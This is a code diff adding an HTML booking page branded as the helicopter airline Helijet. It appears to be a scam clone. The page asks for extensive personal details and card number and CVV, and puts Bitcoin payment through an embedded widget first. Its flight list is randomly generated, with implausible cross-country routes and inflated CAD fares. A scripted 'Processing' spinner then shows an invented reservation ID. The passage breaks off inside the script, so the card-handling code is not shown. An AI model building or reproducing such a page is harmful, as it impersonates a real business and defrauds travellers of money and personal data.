@@ -1,0 +1,949 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Book a Flight | Helijet</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&family=Merriweather:wght@400;700&display=swap"/>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Open Sans',sans-serif;background:#f4f6f9;color:#333;min-height:100vh}
+
+/* ── Top nav bar ── */
+#booking-header{background:#0d2b6b;padding:0 30px;display:flex;align-items:center;justify-content:space-between;height:64px}
+#booking-header .logo{color:#fff;font-family:'Merriweather',serif;font-size:22px;font-weight:700;letter-spacing:1px;text-decoration:none}
+#booking-header .phone{color:#cce0ff;font-size:13px}
+
+/* ── Close button ── */
+#close-btn{position:fixed;top:12px;right:12px;width:32px;height:32px;background:#333;color:#fff;border:none;border-radius:4px;font-size:18px;cursor:pointer;z-index:999;display:flex;align-items:center;justify-content:center;line-height:1}
+#close-btn:hover{background:#555}
+
+/* ── Layout ── */
+.booking-wrap{max-width:860px;margin:30px auto 60px;padding:0 16px}
+
+/* ── Step block ── */
+.step-block{background:#fff;border:1px solid #dde2ea;border-radius:4px;margin-bottom:18px;overflow:hidden}
+.step-header{background:#f0f2f6;border-bottom:2px solid #2152b2;padding:12px 18px;display:flex;align-items:center;gap:12px}
+.step-num{background:#c0392b;color:#fff;font-weight:700;font-size:13px;width:26px;height:26px;border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.step-title{color:#2152b2;font-size:15px;font-weight:700;text-transform:uppercase;letter-spacing:.5px}
+.step-body{padding:20px 22px}
+
+/* ── Step 1: Flight selection ── */
+.route-label{font-weight:700;color:#222;font-size:15px;margin-bottom:14px}
+.date-tabs{display:flex;gap:0;border-bottom:1px solid #ccc;margin-bottom:0;flex-wrap:nowrap;overflow-x:auto;-webkit-overflow-scrolling:touch;scrollbar-width:thin}
+.date-tab{padding:9px 18px;font-size:12px;cursor:pointer;border:1px solid #ddd;border-bottom:none;background:#f9f9f9;color:#555;margin-right:2px;border-radius:3px 3px 0 0;transition:background .2s}
+.date-tab.active{background:#2152b2;color:#fff;border-color:#2152b2}
+.date-tab.past{background:#ececec;color:#bbb;cursor:not-allowed;pointer-events:none;opacity:.65}
+.date-tab small{display:block;font-size:10px;color:#aaa}
+.date-tab.active small{color:#aab8e0}
+.flight-table-head{display:grid;grid-template-columns:80px 90px 90px 1fr 120px;background:#e8ecf2;font-size:12px;font-weight:700;padding:8px 12px;gap:8px;border-top:1px solid #ccd}
+.no-flights{background:#f5f5f0;padding:14px 14px;font-size:13px;color:#666;font-style:italic;border-top:1px solid #ddd}
+.action-row{display:flex;gap:10px;flex-wrap:wrap;padding:14px 0 4px}
+.btn-outline{padding:8px 18px;font-size:12px;font-weight:700;border:2px solid #c0392b;background:#c0392b;color:#fff;border-radius:3px;cursor:pointer;text-transform:uppercase;letter-spacing:.5px;transition:background .2s}
+.btn-outline:hover{background:#a93226}
+.btn-ghost{padding:8px 18px;font-size:12px;font-weight:700;border:2px solid #5b6a8a;background:#5b6a8a;color:#fff;border-radius:3px;cursor:pointer;text-transform:uppercase;letter-spacing:.5px}
+.btn-nav{padding:8px 14px;font-size:12px;font-weight:600;border:1px solid #bbb;background:#fff;color:#444;border-radius:3px;cursor:pointer}
+.btn-sort{padding:8px 16px;font-size:12px;font-weight:700;border:2px solid #2152b2;background:#2152b2;color:#fff;border-radius:3px;cursor:pointer;text-transform:uppercase;letter-spacing:.5px;margin-left:auto}
+
+/* ── Step 2: Passengers ── */
+.login-bar{background:#f8f8f8;border:1px solid #e0e0e0;border-radius:4px;padding:14px 18px;display:flex;align-items:center;justify-content:space-between;margin-bottom:18px;flex-wrap:wrap;gap:10px}
+.login-bar span{font-size:14px;color:#444}
+.login-now-btn{background:#c0392b;color:#fff;border:none;padding:9px 18px;font-size:13px;font-weight:700;border-radius:3px;cursor:pointer;display:flex;align-items:center;gap:6px}
+.login-now-btn:after{content:'▾'}
+.create-link{color:#2152b2;font-size:13px;text-decoration:none;font-weight:600}
+.create-link:hover{text-decoration:underline}
+.pax-hint{font-size:13px;color:#555;margin-bottom:14px}
+.pax-num{display:inline-block;background:#2152b2;color:#fff;width:22px;height:22px;border-radius:50%;text-align:center;line-height:22px;font-size:12px;font-weight:700;margin-right:6px}
+.form-grid{display:grid;grid-template-columns:1fr 1fr 120px 1fr 1fr;gap:8px;margin-bottom:8px}
+.form-grid2{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:8px}
+.form-full{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-top:16px}
+.form-col label{font-size:12px;font-weight:600;color:#555;display:block;margin-bottom:4px}
+.form-col .row{display:grid;grid-template-columns:120px 1fr;gap:8px;margin-bottom:8px;align-items:center}
+.form-col .row label{margin:0}
+input[type=text],input[type=email],input[type=tel],input[type=date],select{width:100%;padding:8px 10px;border:1px solid #ccc;border-radius:3px;font-size:13px;color:#444;background:#fff}
+input[type=text]:focus,input[type=email]:focus,input[type=tel]:focus,input[type=date]:focus,select:focus{outline:none;border-color:#2152b2;box-shadow:0 0 0 2px rgba(33,82,178,.12)}
+input.req,select.req{border:1px solid #e74c3c;border-left:3px solid #e74c3c}
+input.req:focus,select.req:focus{border-color:#e74c3c;box-shadow:0 0 0 2px rgba(231,76,60,.12)}
+
+/* ── Selected flight row ── */
+.ft-tier-row{cursor:pointer;transition:background .15s}
+.ft-tier-row.row-selected{background:#dce8ff !important;outline:2px solid #2152b2;outline-offset:-2px;border-radius:2px}
+.ft-tier-row.row-selected .ft-flight-num,.ft-tier-row.row-selected .ft-price{color:#0d2b6b}
+
+/* ── Step 3: Summary ── */
+.summary-right{max-width:340px;margin-left:auto;border:1px solid #ddd;border-radius:4px;overflow:hidden}
+.sum-row{display:flex;justify-content:space-between;padding:10px 16px;border-bottom:1px solid #eee;font-size:13px}
+.sum-row.total{background:#888;color:#fff;font-weight:700;font-size:15px}
+.coupon-row{display:flex;gap:0;padding:8px 16px;border-bottom:1px solid #eee}
+.coupon-row input{flex:1;padding:7px 10px;border:1px solid #ccc;border-radius:3px 0 0 3px;font-size:13px}
+.coupon-row button{padding:7px 12px;border:none;background:#2152b2;color:#fff;border-radius:0 3px 3px 0;cursor:pointer}
+.ref-row{padding:10px 16px;border-bottom:1px solid #eee}
+.ref-row input{width:100%}
+.agent-row{padding:10px 16px;font-size:13px;display:flex;align-items:center;gap:8px}
+.agent-row input[type=checkbox]{width:auto}
+
+/* ── Step 4: Payment ── */
+.payment-wrap{display:grid;grid-template-columns:240px 1fr;gap:24px;align-items:start}
+.payment-options label{display:flex;align-items:center;gap:8px;padding:6px 0;font-size:13px;cursor:pointer}
+.payment-options input[type=radio]{accent-color:#2152b2}
+.card-form label{display:block;font-size:12px;font-weight:600;color:#555;margin-bottom:3px;margin-top:12px}
+.card-form input,.card-form select{max-width:260px}
+.exp-row{display:flex;gap:8px}
+.exp-row select{flex:1}
+.tc-link{color:#2152b2;font-size:12px;text-decoration:none;display:block;margin-top:14px}
+.card-logos{display:flex;gap:6px;margin-top:12px;align-items:center}
+.card-logos img{height:28px}
+.ssl-note{font-size:11px;color:#2152b2;margin-top:10px}
+
+/* ── Crypto sub-options ── */
+#crypto-subopts{display:none;margin-top:14px;padding:14px 16px;background:#f7f9ff;border:1px solid #c5d3f0;border-radius:6px;animation:fadeIn .2s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:translateY(0)}}
+#crypto-subopts p{font-size:12px;font-weight:700;color:#2152b2;margin-bottom:10px;text-transform:uppercase;letter-spacing:.5px}
+.crypto-coin-btn{display:flex;align-items:center;gap:10px;padding:10px 14px;border:2px solid #dde2ea;border-radius:8px;background:#fff;cursor:pointer;font-size:13px;font-weight:600;color:#333;margin-bottom:8px;width:100%;text-align:left;transition:border-color .2s,background .2s}
+.crypto-coin-btn:hover{border-color:#f7931a;background:#fff8f0}
+.crypto-coin-btn.usdt:hover{border-color:#26a17b;background:#f0fff8}
+.crypto-coin-btn .coin-icon{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:15px;flex-shrink:0}
+.coin-btc{background:#f7931a}
+.coin-usdt{background:#26a17b}
+.coin-label{display:flex;flex-direction:column;line-height:1.2}
+.coin-label small{font-size:10px;font-weight:400;color:#888}
+.usdt-note{display:none;margin-top:6px;padding:10px 14px;background:#e8f8f2;border:1px solid #26a17b;border-radius:6px;font-size:12px;color:#1a7a5a}
+
+/* ── NOWPayments modal ── */
+#np-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:9000;align-items:center;justify-content:center;backdrop-filter:blur(3px)}
+#np-overlay.open{display:flex}
+#np-modal{position:relative;border-radius:12px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.4);animation:popIn .25s cubic-bezier(.34,1.56,.64,1)}
+@keyframes popIn{from{opacity:0;transform:scale(.88)}to{opacity:1;transform:scale(1)}}
+#np-close{position:absolute;top:8px;right:10px;width:30px;height:30px;border:none;background:rgba(0,0,0,.55);color:#fff;font-size:18px;border-radius:50%;cursor:pointer;z-index:10;display:flex;align-items:center;justify-content:center;line-height:1;transition:background .2s}
+#np-close:hover{background:rgba(0,0,0,.8)}
+
+/* ── Step 5: Confirmation ── */
+.conf-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px}
+.conf-options label{display:flex;align-items:center;gap:8px;padding:5px 0;font-size:13px;cursor:pointer}
+.conf-options input[type=radio]{accent-color:#2152b2}
+.safe-sender-note{background:#fff8e1;border:1px solid #ffe082;border-radius:4px;padding:12px 16px;font-size:12px;color:#555;display:flex;gap:10px;align-items:flex-start}
+.safe-sender-note .icon{font-size:18px;color:#f39c12;flex-shrink:0}
+.safe-sender-note a{color:#2152b2}
+
+/* ── Reservation confirmation modal ── */
+#res-overlay{display:none;position:fixed;inset:0;background:rgba(10,20,50,.72);z-index:9500;align-items:center;justify-content:center;backdrop-filter:blur(4px)}
+#res-overlay.open{display:flex}
+#res-modal{background:#fff;border-radius:16px;padding:44px 40px 36px;max-width:440px;width:90%;text-align:center;box-shadow:0 24px 70px rgba(0,0,0,.35);animation:popIn .3s cubic-bezier(.34,1.56,.64,1);position:relative;min-height:220px}
+
+/* Spinner phase */
+#res-spinner-phase{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:22px;padding:20px 0 10px}
+.res-spinner{width:62px;height:62px;border:5px solid #e0e8f8;border-top-color:#2152b2;border-radius:50%;animation:spin 0.85s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.res-spinner-text{font-size:14px;font-weight:600;color:#555;letter-spacing:.3px}
+.res-spinner-sub{font-size:12px;color:#aaa;margin-top:-14px}
+
+/* Confirmation phase */
+#res-confirm-phase{display:none;opacity:0;transition:opacity .5s ease}
+#res-confirm-phase.visible{opacity:1}
+.res-icon-wrap{width:72px;height:72px;border-radius:50%;background:linear-gradient(135deg,#1a8a4a 0%,#27ae60 100%);display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 6px 20px rgba(39,174,96,.35)}
+.res-icon-wrap svg{width:38px;height:38px}
+.res-id-label{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:#888;margin-bottom:6px}
+.res-id{font-family:'Merriweather',serif;font-size:22px;font-weight:700;color:#0d2b6b;letter-spacing:2px;background:#f0f4ff;border:2px dashed #b0c0e8;border-radius:8px;padding:10px 20px;display:inline-block;margin-bottom:20px}
+.res-headline{font-size:17px;font-weight:700;color:#1a2e5a;margin-bottom:10px}
+.res-sub{font-size:13px;color:#666;line-height:1.6;margin-bottom:28px}
+.res-close-btn{background:#0d2b6b;color:#fff;border:none;padding:13px 40px;font-size:14px;font-weight:700;border-radius:6px;cursor:pointer;text-transform:uppercase;letter-spacing:.5px;transition:background .2s;width:100%}
+.res-close-btn:hover{background:#1a3e8a}
+
+/* ── Submit bar ── */
+.submit-bar{background:#fff;border:1px solid #dde2ea;border-radius:4px;padding:18px 22px;display:flex;justify-content:flex-end;align-items:center;gap:16px}
+.submit-btn{background:#2152b2;color:#fff;border:none;padding:12px 36px;font-size:14px;font-weight:700;border-radius:3px;cursor:pointer;text-transform:uppercase;letter-spacing:.5px;transition:background .2s}
+.submit-btn:hover{background:#1a3e8a}
+.cancel-link{color:#888;font-size:13px;text-decoration:none}
+.cancel-link:hover{color:#333}
+
+/* ── Flight results table ── */
+.ft-wrap{border:1px solid #c8cfe0;border-radius:0 0 4px 4px;overflow:hidden;margin-bottom:0}
+.ft-head{display:grid;grid-template-columns:60px 70px 1fr 1fr 1fr 110px;background:#1e3a7a;color:#fff;font-size:12px;font-weight:700;padding:9px 12px;gap:6px;letter-spacing:.3px}
+.ft-body{}
+.ft-flight-group{border-bottom:1px solid #dde3ef}
+.ft-flight-group:last-child{border-bottom:none}
+.ft-tier-row{display:grid;grid-template-columns:60px 70px 1fr 1fr 1fr 110px;padding:7px 12px;gap:6px;align-items:center;font-size:12px;transition:background .15s}
+.ft-tier-row:hover{background:#f0f4ff}
+.ft-tier-row.odd-group{background:#fafbfd}
+.ft-tier-row.odd-group:hover{background:#eef2ff}
+.ft-flight-num{font-weight:700;color:#1e3a7a;font-size:13px}
+.ft-date-cell{color:#555}
+.ft-dep,.ft-arr{color:#333;font-size:11px;line-height:1.4}
+.ft-dep strong,.ft-arr strong{display:block;font-size:13px;color:#111}
+.ft-tier-cell{display:flex;align-items:center;gap:7px}
+.ft-tier-cell input[type=radio]{accent-color:#2152b2;cursor:pointer}
+.tier-name{font-size:11px;font-weight:700;letter-spacing:.4px;color:#333}
+.avail{font-size:11px;font-style:italic}
+.avail.few{color:#e67e22}
+.avail.ok{color:#e67e22}
+.avail.sold{color:#999}
+.avail.waitlist{color:#7f8c8d;font-style:normal;font-weight:600}
+.ft-price{font-weight:700;color:#2152b2;font-size:13px;text-align:right}
+.ft-price.sold{color:#aaa;font-weight:400;font-style:italic}
+.ft-no-flights{padding:16px 14px;font-size:13px;color:#666;font-style:italic;background:#f5f5f0;border-top:1px solid #ddd}
+.date-tab small{display:block;font-size:10px;color:#aab8e0;margin-top:1px}
+.date-tab:not(.active) small{color:#e67e22}
+@media(max-width:640px){
+  .payment-wrap,.conf-grid,.form-grid,.form-grid2,.form-full{grid-template-columns:1fr}
+  .ft-head,.ft-tier-row{grid-template-columns:44px 56px 1fr 1fr 1fr 80px;font-size:11px;padding:6px 8px}
+  .date-tabs{flex-wrap:nowrap;overflow-x:auto}
+}
+</style>
+</head>
+<body>
+
+<header id="booking-header">
+  <a class="logo" href="../index.html">Helijet</a>
+  <span class="phone">Reservations: 1.800.665.4354</span>
+</header>
+
+<button id="close-btn" onclick="window.location='../index.html'" title="Close">✕</button>
+
+<div class="booking-wrap">
+
+  <!-- ══ STEP 1: FLIGHT SELECTION ══ -->
+  <div class="step-block">
+    <div class="step-header">
+      <div class="step-num">1</div>
+      <span class="step-title" id="step1-route">Sunday &nbsp; Richmond (YVR-South) to Victoria Harbour</span>
+    </div>
+    <div class="step-body">
+      <div class="date-tabs" id="date-tabs"></div>
+      <div id="flights-container">
+        <div class="ft-wrap">
+          <div class="ft-head">
+            <span>Flight</span><span>Date</span><span>Departure</span><span>Arrival</span><span>Tier</span><span style="text-align:right">Grand Total</span>
+          </div>
+          <div class="ft-body" id="ft-body"></div>
+        </div>
+      </div>
+      <div class="action-row">
+        <button class="btn-outline">Reverse Route</button>
+        <button class="btn-ghost">Modify Search</button>
+        <button class="btn-nav" id="btn-prev-date">« Prev</button>
+        <button class="btn-nav" id="btn-next-date">Next »</button>
+        <button class="btn-sort">Sort by Price</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ STEP 2: PASSENGERS ══ -->
+  <div class="step-block">
+    <div class="step-header">
+      <div class="step-num">2</div>
+      <span class="step-title">Passengers</span>
+    </div>
+    <div class="step-body">
+      <div class="login-bar">
+        <span>Have an existing Helijet login?</span>
+        <button class="login-now-btn" onclick="window.location='../account/index.html'">Login Now</button>
+        <a href="../account/index.html?tab=create" class="create-link">Create an Account</a>
+      </div>
+      <p class="pax-hint">Please sign in or enter your passenger details.</p>
+
+      <div style="margin-bottom:16px">
+        <span class="pax-num">1</span>
+        <div class="form-grid" style="margin-top:10px">
+          <input type="text" placeholder="First Name" class="req"/>
+          <input type="text" placeholder="Last Name" class="req"/>
+          <select class="req"><option>Male</option><option>Female</option><option>Other</option></select>
+          <input type="text" placeholder="Heli #"/>
+          <input type="text" placeholder="Comments"/>
+        </div>
+        <div class="form-grid2">
+          <input type="email" placeholder="email@company.com" class="req"/>
+          <input type="date" placeholder="Date of Birth" class="req"/>
+          <input type="tel" placeholder="Phone (xxx-xxx-xxxx)" class="req"/>
+        </div>
+      </div>
+
+      <div class="form-full">
+        <div class="form-col">
+          <div class="row"><label>Name</label><select class="req"><option></option></select></div>
+          <div class="row"><label>Company</label><input type="text"/></div>
+          <div class="row"><label>Address</label>
+            <div>
+              <input type="text" placeholder="Address" class="req" style="margin-bottom:6px"/>
+              <input type="text" placeholder="City" class="req" style="margin-bottom:6px"/>
+              <div style="display:flex;gap:8px;margin-bottom:6px">
+                <input type="text" placeholder="State" style="flex:1"/>
+                <input type="text" placeholder="Zip" style="flex:1"/>
+              </div>
+              <select><option>Canada</option><option>USA</option><option>Other</option></select>
+            </div>
+          </div>
+        </div>
+        <div class="form-col">
+          <div class="row"><label>Business</label><input type="tel" placeholder="xxx-xxx-xxxx" class="req"/></div>
+          <div class="row"><label>Home</label><input type="tel" placeholder="xxx-xxx-xxxx" class="req"/></div>
+          <div class="row"><label>Mobile</label><input type="tel" placeholder="xxx-xxx-xxxx" class="req"/></div>
+          <div class="row"><label>Fax</label><input type="tel" placeholder="xxx-xxx-xxxx"/></div>
+          <div class="row"><label>Email</label><input type="email" placeholder="email@company.com" class="req"/></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ STEP 3: SUMMARY ══ -->
+  <div class="step-block">
+    <div class="step-header">
+      <div class="step-num">3</div>
+      <span class="step-title">Summary</span>
+    </div>
+    <div class="step-body">
+      <div class="summary-right">
+        <div class="sum-row"><span>Subtotal</span><span id="sum-subtotal">CAD 0.00</span></div>
+        <div class="sum-row"><span>Taxes</span><span id="sum-tax">CAD 0.00</span></div>
+        <div class="coupon-row">
+          <input type="text" placeholder="Coupon"/>
+          <button>🔍</button>
+        </div>
+        <div class="sum-row total"><span>Grand Total</span><span id="sum-grand">CAD 0.00</span></div>
+        <div class="ref-row"><input type="text" placeholder="Reference Number (Optional)"/></div>
+        <div class="agent-row"><input type="checkbox" id="agent-link"/><label for="agent-link">Link to travel agent</label></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ STEP 4: PAYMENT ══ -->
+  <div class="step-block">
+    <div class="step-header">
+      <div class="step-num">4</div>
+      <span class="step-title">Payment</span>
+    </div>
+    <div class="step-body">
+      <p style="font-size:13px;color:#555;margin-bottom:16px">Please note that we do not accept Visa Debit for online bookings.</p>
+      <div class="payment-wrap">
+
+        <!-- Left: payment type radios -->
+        <div class="payment-options">
+
+          <!-- 1st: Cryptocurrency -->
+          <label style="font-weight:700;color:#2152b2">
+            <input type="radio" name="pay" value="crypto" id="pay-crypto"/>
+            <span style="display:flex;align-items:center;gap:6px">
+              <span style="font-size:16px">₿</span> Cryptocurrency
+            </span>
+          </label>
+
+          <!-- Crypto sub-options (BTC / USDT) -->
+          <div id="crypto-subopts">
+            <p>Select Cryptocurrency</p>
+            <button type="button" class="crypto-coin-btn" id="btn-btc">
+              <span class="coin-icon coin-btc">₿</span>
+              <span class="coin-label">Bitcoin<small>BTC</small></span>
+            </button>
+            <button type="button" class="crypto-coin-btn usdt" id="btn-usdt">
+              <span class="coin-icon coin-usdt" style="color:#fff;font-weight:700">₮</span>
+              <span class="coin-label">Tether<small>USDT</small></span>
+            </button>
+            <div class="usdt-note" id="usdt-note">⚠ USDT payments are currently unavailable. Please select BTC or another payment method.</div>
+          </div>
+
+          <!-- Divider -->
+          <div style="border-top:1px solid #dde2ea;margin:10px 0 8px;"></div>
+          <p style="font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;color:#888;margin-bottom:6px">Credit Card</p>
+
+          <!-- 2nd: Card options -->
+          <label><input type="radio" name="pay" value="amex" id="pay-amex"/> American Express</label>
+          <label><input type="radio" name="pay" value="account" id="pay-account"/> On Account</label>
+          <label><input type="radio" name="pay" value="qt" id="pay-qt"/> Quick Ticket (Prepaid)</label>
+        </div>
+
+        <!-- Right: card form (shown when card option selected) -->
+        <div class="card-form" id="card-form-wrap">
+          <label>Number</label>
+          <input type="text" id="card-number-input" placeholder="Card Number" autocomplete="off"/>
+          <label>Expiration</label>
+          <div class="exp-row">
+            <select><option>Month</option><option>01</option><option>02</option><option>03</option><option>04</option><option>05</option><option>06</option><option>07</option><option>08</option><option>09</option><option>10</option><option>11</option><option>12</option></select>
+            <select><option>Year</option><option>2025</option><option>2026</option><option>2027</option><option>2028</option><option>2029</option><option>2030</option></select>
+          </div>
+          <label>CVV</label>
+          <input type="text" placeholder="CVV" style="max-width:80px"/>
+          <a href="#" class="tc-link">Terms &amp; Conditions</a>
+          <div class="card-logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="Amex" style="height:28px"/>
+          </div>
+          <p class="ssl-note">Booking services and 2048-bit encryption provided by Blue Sky Booking.</p>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ NOWPayments BTC modal ══ -->
+  <div id="np-overlay" role="dialog" aria-modal="true" aria-label="Bitcoin Payment">
+    <div id="np-modal">
+      <button id="np-close" aria-label="Close payment widget" title="Close">✕</button>
+      <iframe
+        src="https://nowpayments.io/embeds/payment-widget?iid=4711591538"
+        width="410" height="696"
+        frameborder="0" scrolling="no"
+        style="overflow-y:hidden;display:block">
+        Can't load widget
+      </iframe>
+    </div>
+  </div>
+
+  <!-- ══ Reservation confirmation modal ══ -->
+  <div id="res-overlay" role="dialog" aria-modal="true" aria-label="Reservation Confirmed">
+    <div id="res-modal">
+
+      <!-- Phase 1: Spinner -->
+      <div id="res-spinner-phase">
+        <div class="res-spinner"></div>
+        <div class="res-spinner-text">Processing your reservation&hellip;</div>
+        <div class="res-spinner-sub">Please do not close this window</div>
+      </div>
+
+      <!-- Phase 2: Confirmation -->
+      <div id="res-confirm-phase">
+        <div class="res-icon-wrap">
+          <svg viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="3" y="9" width="32" height="22" rx="3" fill="white" fill-opacity="0.2" stroke="white" stroke-width="2"/>
+            <polyline points="3,9 19,22 35,9" stroke="white" stroke-width="2" fill="none"/>
+            <polyline points="11,19 17,25 27,13" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <div class="res-id-label">Reservation ID</div>
+        <div class="res-id" id="res-id-display">&mdash;</div>
+        <div class="res-headline">You're all set!</div>
+        <div class="res-sub">Our team will confirm your reservation by email within 24 hours.<br>Please save your Reservation ID for reference.</div>
+        <button class="res-close-btn" id="res-close-btn">Close</button>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ══ STEP 5: CONFIRMATION ══ -->
+  <div class="step-block">
+    <div class="step-header">
+      <div class="step-num">5</div>
+      <span class="step-title">Confirmation</span>
+    </div>
+    <div class="step-body">
+      <div class="conf-grid">
+        <div>
+          <div class="conf-options">
+            <label><input type="radio" name="conf" value="email" checked/> Email</label>
+          </div>
+          <div style="margin-top:10px;display:flex;flex-direction:column;gap:8px">
+            <input type="email" placeholder="email@company.com" class="req"/>
+            <input type="email" placeholder="email@company.com (optional)"/>
+          </div>
+        </div>
+        <div class="safe-sender-note">
+          <span class="icon">⚠</span>
+          <span>To ensure you receive confirmation emails, please add <a href="mailto:passengerservices@helijet.com">passengerservices@helijet.com</a> to your safe senders list.</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Submit -->
+  <div class="submit-bar">
+    <a href="../index.html" class="cancel-link">Cancel</a>
+    <button class="submit-btn" onclick="handleBooking()">Complete Booking</button>
+  </div>
+
+</div><!-- /booking-wrap -->
+
+<script>
+// ── URL params → route label ──
+(function(){
+  var p = new URLSearchParams(window.location.search);
+  var from = p.get('from'), to = p.get('to'), day = p.get('day');
+  if(from && to){
+    document.getElementById('step1-route').textContent = (day||'') + '   ' + from + ' to ' + to;
+  }
+})();
+
+// ── Seeded PRNG (mulberry32) — stable randomness per date ──
+function makePRNG(seed) {
+  var s = seed >>> 0;
+  return function() {
+    s += 0x6D2B79F5;
+    var t = Math.imul(s ^ s >>> 15, 1 | s);
+    t ^= t + Math.imul(t ^ t >>> 7, 61 | t);
+    return ((t ^ t >>> 14) >>> 0) / 4294967296;
+  };
+}
+
+// Turn a date key string into a numeric seed
+function strSeed(str) {
+  var h = 0x811c9dc5;
+  for (var i = 0; i < str.length; i++) {
+    h ^= str.charCodeAt(i);
+    h = Math.imul(h, 0x01000193);
+  }
+  return h >>> 0;
+}
+
+// Availability pool
+var AV = {
+  few:      {label:'3 or less',      cls:'few'},
+  ok:       {label:'Available',      cls:'ok'},
+  sold:     {label:'Sold out!',      cls:'sold'},
+  waitlist: {label:'Call to Waitlist', cls:'waitlist'}
+};
+var AV_LIST = [AV.few, AV.ok, AV.sold, AV.waitlist];
+// Weighted: 30% few, 40% ok, 20% sold, 10% waitlist
+var AV_WEIGHTS = [0.30, 0.70, 0.90, 1.00];
+
+function pickAV(rng) {
+  var r = rng();
+  for (var i = 0; i < AV_WEIGHTS.length; i++) {
+    if (r < AV_WEIGHTS[i]) return AV_LIST[i];
+  }
+  return AV.ok;
+}
+
+// All possible time slots pool (flight#, dep, arr)
+var ALL_SLOTS = [
+  [701,'08:05','08:40'],[703,'08:30','09:05'],[705,'09:00','09:35'],
+  [707,'09:55','10:30'],[709,'11:00','11:35'],[711,'12:30','13:05'],
+  [713,'13:30','14:05'],[715,'14:30','15:05'],[717,'15:30','16:05'],
+  [719,'16:30','17:05'],[721,'17:30','18:05'],[723,'18:30','19:05'],
+  [725,'19:30','20:05'],[727,'20:30','21:05']
+];
+
+var TIER_SETS = [
+  ['FLASH SALE','ULTRA-SAVER','SUPER SALE','SALES','FULL FARE'],
+  ['ULTRA-SAVER','SUPER SALE','SALES','FULL FARE'],
+  ['FLASH SALE','ULTRA-SAVER','SUPER SALE','SALES'],
+  ['ULTRA-SAVER','SUPER SALE','SALES'],
+  ['FLASH SALE','ULTRA-SAVER','SUPER SALE','SALES','FULL FARE'],
+  ['ULTRA-SAVER','SALES','FULL FARE']
+];
+
+// Price gaps per tier index (FLASH=0, ULTRA=1, SUPER=2, SALES=3, FULL=4)
+var TIER_PRICE_OFFSET = {
+  'FLASH SALE':   0,
+  'ULTRA-SAVER':  333,
+  'SUPER SALE':   850,
+  'SALES':        1100,
+  'FULL FARE':    1500
+};
+
+// ── Route pool: [dep city, arr city] ──
+var ROUTES = [
+  ['Vancouver Harbour',        'Port of Quebec (Quebec)'],
+  ['Vancouver Int\'l (YVR-S)', 'Port of Montreal (Quebec)'],
+  ['Coal Harbour Heliport',    'Port of Vancouver (British Columbia)'],
+  ['Richmond Heliport',        'Port of Montreal (Quebec)'],
+  ['Victoria Harbour',         'Port of Quebec (Quebec)'],
+  ['Nanaimo Harbour',          'Port of Montreal (Quebec)'],
+  ['Vancouver Harbour',        'Port of Vancouver (British Columbia)'],
+  ['Coal Harbour Heliport',    'Port of Montreal (Quebec)'],
+];
+function pickRoute(rng){ return ROUTES[Math.floor(rng() * ROUTES.length)]; }
+
+function buildRandomSchedule(dateKey, dateLabel) {
+  var rng    = makePRNG(strSeed(dateKey));
+  // Pick 3–9 flights
+  var count  = 3 + Math.floor(rng() * 7);          // 3..9
+  var base   = 3000 + Math.floor(rng() * 600);     // 3000..3599
+
+  // Shuffle ALL_SLOTS and take first `count`
+  var pool   = ALL_SLOTS.slice();
+  for (var i = pool.length - 1; i > 0; i--) {
+    var j = Math.floor(rng() * (i + 1));
+    var tmp = pool[i]; pool[i] = pool[j]; pool[j] = tmp;
+  }
+  pool = pool.slice(0, count).sort(function(a,b){ return a[0]-b[0]; });
+
+  var flights = [];
+  pool.forEach(function(slot, si) {
+    var tierSet = TIER_SETS[Math.floor(rng() * TIER_SETS.length)];
+    var slotBase = base + si * Math.floor(rng() * 60 + 20);   // each flight slightly pricier
+
+    // Determine availability cascade: once sold/waitlist, remaining are too
+    var hitWall = false;
+    var tiers = tierSet.map(function(name) {
+      var av;
+      if (hitWall) {
+        av = rng() < 0.6 ? AV.sold : AV.waitlist;
+      } else {
+        av = pickAV(rng);
+        if (av === AV.sold || av === AV.waitlist) hitWall = true;
+      }
+      var price = 'CAD ' + (slotBase + TIER_PRICE_OFFSET[name]).toLocaleString();
+      return { name: name, avail: av, price: (av===AV.sold||av===AV.waitlist) ? '' : price };
+    });
+
+    var route = pickRoute(rng);
+    flights.push({
+      num:  slot[0],
+      date: dateLabel,
+      dep:  slot[1] + ' ' + route[0],
+      arr:  slot[2] + ' ' + route[1],
+      tiers: tiers
+    });
+  });
+  return flights;
+}
+
+// ── 30-day date range (May 14 – June 12, 2026) ──
+var DAY_NAMES  = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
+var MON_NAMES  = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+var DATE_START = new Date(2026, 4, 14); // May 14
+var DATE_COUNT = 30;
+
+var ALL_DATES = (function(){
+  var arr = [], d = new Date(DATE_START);
